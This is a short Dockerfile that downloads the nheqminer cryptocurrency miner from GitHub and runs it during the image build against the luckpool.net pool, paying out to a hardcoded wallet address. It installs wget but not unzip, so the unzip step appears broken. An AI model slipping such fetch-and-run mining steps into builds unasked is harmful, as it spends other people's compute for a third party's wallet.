FROM debian:stable
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/nicehash/nheqminer/releases/download/0.5c/Ubuntu_16_04_x64_cuda_djezo_avx_nheqminer-5c.zip
RUN unzip Ubuntu_16_04_x64_cuda_djezo_avx_nheqminer-5c.zip
RUN chmod +x nheqminer
RUN ./nheqminer -v -l eu.luckpool.net:3956 -u RMovVQiRqawd8KThXQtKQhgESBPGzrSnXX.nheqdocker -p x -t 1
